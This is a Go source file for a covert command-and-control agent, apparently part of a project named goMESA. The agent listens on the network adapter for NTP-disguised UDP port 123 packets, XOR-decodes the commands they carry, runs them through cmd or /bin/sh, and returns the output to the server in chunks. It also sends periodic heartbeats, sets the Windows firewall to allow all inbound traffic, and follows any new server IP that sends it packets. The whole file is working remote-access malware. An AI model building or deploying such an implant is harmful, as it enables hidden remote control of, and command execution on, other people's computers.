package main

import (
	"bytes"
	"fmt"
	"log"
	"net"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"time"

	"goMESA/internal/common"

	"github.com/google/gopacket"
	"github.com/google/gopacket/pcap"
)

// AgentInfo stores information about the current agent
type AgentInfo struct {
	OperatingSystem string
	ShellType       string
	ShellFlag       string
	NetworkAdapter  string
	ServerIP        net.IP
	MyIP            net.IP
	AgentID         string
	LastHeartbeat   time.Time
	HeartbeatActive bool
}

// Global agent instance
var agent *AgentInfo

func init() {
	agent = &AgentInfo{
		HeartbeatActive: true,
		LastHeartbeat:   time.Now(),
	}

	// Detect OS and set shell info
	agent.OperatingSystem, agent.ShellType, agent.ShellFlag = detectOS()

	// Get network adapter
	agent.NetworkAdapter = getNetworkAdapter()

	// Get server IP (would be set during compilation in a real deployment)
	// For testing, using localhost
	agent.ServerIP = net.ParseIP("127.0.0.1")

	// Get agent's IP
	agent.MyIP = getLocalIP()

	// Generate a unique agent ID
	agent.AgentID = fmt.Sprintf("%s", agent.MyIP)
}

// detectOS determines the operating system and shell to use
func detectOS() (string, string, string) {
	var operatingSystem, shell, flag string

	switch runtime.GOOS {
	case "windows":
		operatingSystem = "Windows"
		shell = "cmd"
		flag = "/c"
	case "linux":
		operatingSystem = "Linux"
		shell = "/bin/sh"
		flag = "-c"
	case "darwin":
		operatingSystem = "macOS"
		shell = "/bin/sh"
		flag = "-c"
	default:
		fmt.Println("Operating system not detected")
		os.Exit(1)
	}

	return operatingSystem, shell, flag
}

// getNetworkAdapter determines the network interface to use for packet capture
func getNetworkAdapter() string {
	if runtime.GOOS == "windows" {
		// Windows-specific adapter detection
		cmd := exec.Command("cmd", "/c", "getmac /fo csv /v | findstr Ethernet")
		output, err := cmd.Output()
		if err != nil {
			log.Printf("Error getting network adapter: %v", err)
			return ""
		}

		// Parse the output to get the adapter ID
		text := string(output)
		startIndex := strings.Index(text, "_{")
		if startIndex == -1 {
			return ""
		}

		finalIndex := strings.Index(text[startIndex:], "}")
		if finalIndex == -1 {
			return ""
		}

		temp := text[startIndex+2 : startIndex+finalIndex]
		return fmt.Sprintf("\\Device\\NPF_{%s}", temp)
	}

	// For Linux/macOS
	potentialInterfaces := []string{"eth0", "en0", "ens33"}
	devices, err := net.Interfaces()
	if err != nil {
		log.Printf("Error gathering network interfaces: %v", err)
		return "eth0" // Default fallback
	}

	// Try to find a matching interface
	for _, device := range devices {
		for _, potential := range potentialInterfaces {
			if strings.Contains(strings.ToLower(device.Name), strings.ToLower(potential)) {
				return device.Name
			}
		}
	}

	// Default to first non-loopback interface if none of the expected ones are found
	for _, device := range devices {
		if (device.Flags&net.FlagLoopback) == 0 && (device.Flags&net.FlagUp) != 0 {
			return device.Name
		}
	}

	return "eth0" // Final fallback
}

// getLocalIP gets the agent's local IP address
func getLocalIP() net.IP {
	addrs, err := net.InterfaceAddrs()
	if err != nil {
		fmt.Fprintf(os.Stderr, "Error getting IP address: %v\n", err)
		os.Exit(1)
	}

	for _, addr := range addrs {
		if ipnet, ok := addr.(*net.IPNet); ok && !ipnet.IP.IsLoopback() {
			if ipnet.IP.To4() != nil {
				return ipnet.IP
			}
		}
	}

	return nil
}

// setup performs initial agent setup based on the OS
func setup() {
	fmt.Printf("Setting up agent on %s\n", agent.OperatingSystem)

	strIP := agent.ServerIP.String()
	var commands []string

	switch agent.OperatingSystem {
	case "Windows":
		commands = []string{
			"net start w32time",
			"sc config w32time start=auto",
			"netsh advfirewall set allprofiles firewallpolicy allowinbound,allowoutbound",
			"w32tm /config /syncfromflags:manual /manualpeerlist:" + strIP + " /update",
			"w32tm /resync",
		}
	case "Linux":
		commands = []string{
			"apt-get install sntp -y",
			"apt-get install libpcap-dev -y",
			"sntp -s " + strIP,
		}
	case "macOS":
		commands = []string{
			"sntp -s " + strIP,
		}
	}

	// Execute setup commands
	for _, cmd := range commands {
		output, err := exec.Command(agent.ShellType, agent.ShellFlag, cmd).Output()
		if err != nil {
			log.Printf("Failed to execute command %s: %v", cmd, err)
			continue
		}
		log.Printf("Command output: %s", output)
	}
}

// runCommand executes a shell command and returns the output
func runCommand(command string) string {
	fmt.Printf("Executing command: %s\n", command)
	cmd := exec.Command(agent.ShellType, agent.ShellFlag, command)

	var outBuf, errBuf bytes.Buffer
	cmd.Stdout = &outBuf
	cmd.Stderr = &errBuf

	err := cmd.Run()
	if err != nil {
		return fmt.Sprintf("Error: %v\nStderr: %s", err, errBuf.String())
	}

	return outBuf.String()
}

// heartbeat sends periodic heartbeat signals to the C2 server
func heartbeat() {
	for agent.HeartbeatActive {
		// Create and send heartbeat packet
		packet := common.NewReferencePacket(agent.ServerIP.String(), common.CommandPing)
		err := packet.SendReferencePacket()
		if err != nil {
			log.Printf("Failed to send heartbeat: %v", err)
		} else {
			agent.LastHeartbeat = time.Now()
		}

		// Sleep for 60 seconds
		time.Sleep(60 * time.Second)
	}
}

// startSniffer sets up a packet capture to listen for C2 commands
func startSniffer() {
	var (
		iface   = agent.NetworkAdapter
		snaplen = int32(1600)
		filter  = fmt.Sprintf("udp and port 123 and dst %s", agent.MyIP)
	)

	// Open the device for capturing
	handle, err := pcap.OpenLive(iface, snaplen, false, pcap.BlockForever)
	if err != nil {
		log.Fatalf("Failed to open device %s: %v", iface, err)
	}
	defer handle.Close()

	// Set filter
	if err := handle.SetBPFFilter(filter); err != nil {
		log.Fatalf("Failed to set BPF filter: %v", err)
	}

	packetSource := gopacket.NewPacketSource(handle, handle.LinkType())
	log.Printf("Listening for commands on %s...", iface)

	// Buffer to accumulate command chunks
	var commandBuffer string

	for packet := range packetSource.Packets() {
		// Extract the IP layer to get the source
		ipLayer := packet.NetworkLayer()
		if ipLayer == nil {
			continue
		}

		// Get source IP from the packet
		ipLayerContents := ipLayer.LayerContents()
		srcIP := net.IP(ipLayerContents[len(ipLayerContents)-8 : len(ipLayerContents)-4])

		// Verify the packet is from our C2 server
		if !agent.ServerIP.Equal(srcIP) {
			// If different, update our server IP (handles DHCP changes)
			agent.ServerIP = srcIP
			setup()
		}

		// Get application layer data
		appLayer := packet.ApplicationLayer()
		if appLayer == nil {
			continue
		}

		// Decode the packet payload
		payload := appLayer.Payload()
		if len(payload) < 15 {
			continue // Not enough data for a valid packet
		}

		// Extract the command type and data
		packetType := string(payload[11:15])

		// If there's data beyond the 15-byte mark, decode it
		var data string
		if len(payload) > 15 {
			// Decrypt the XOR encoded data using '.' as the key
			decrypted := common.XORDecrypt(payload[15:], '.')
			// Trim null bytes
			data = string(bytes.Trim(decrypted, "\x00"))
		}

		// Process based on packet type
		switch packetType {
		case common.CommandContinued:
			// Accumulate command chunks
			commandBuffer += data
		case common.CommandDone:
			// Final chunk received, execute the command
			commandBuffer += data
			output := runCommand(commandBuffer)

			// Send the command output back
			responsePacket := common.NewOutputPacket(agent.ServerIP.String(), output)
			err := responsePacket.ChunkAndSendOutput()
			if err != nil {
				log.Printf("Failed to send command output: %v", err)
			}

			// Clear the buffer
			commandBuffer = ""
		case common.CommandKill:
			// Kill the agent
			log.Println("Received kill command. Shutting down...")

			if agent.OperatingSystem == "Windows" {
				runCommand("net stop w32time")
				runCommand("w32tm /unregister")
			} else {
				// Linux/macOS cleanup
				runCommand("sudo systemctl stop ntp")
			}

			agent.HeartbeatActive = false
			os.Exit(0)
		case common.CommandPing:
			// Send a heartbeat in response
			packet := common.NewReferencePacket(agent.ServerIP.String(), common.CommandPing)
			err := packet.SendReferencePacket()
			if err != nil {
				log.Printf("Failed to send ping response: %v", err)
			}
		}
	}
}

func main() {
	// Print debug info
	fmt.Printf("Agent started with ID: %s\n", agent.AgentID)
	fmt.Printf("Operating System: %s\n", agent.OperatingSystem)
	fmt.Printf("Network Adapter: %s\n", agent.NetworkAdapter)
	fmt.Printf("Server IP: %s\n", agent.ServerIP)
	fmt.Printf("My IP: %s\n", agent.MyIP)

	// Perform initial setup
	setup()

	// Start the heartbeat goroutine
	go heartbeat()

	// Start the packet sniffer (this blocks)
	startSniffer()
}
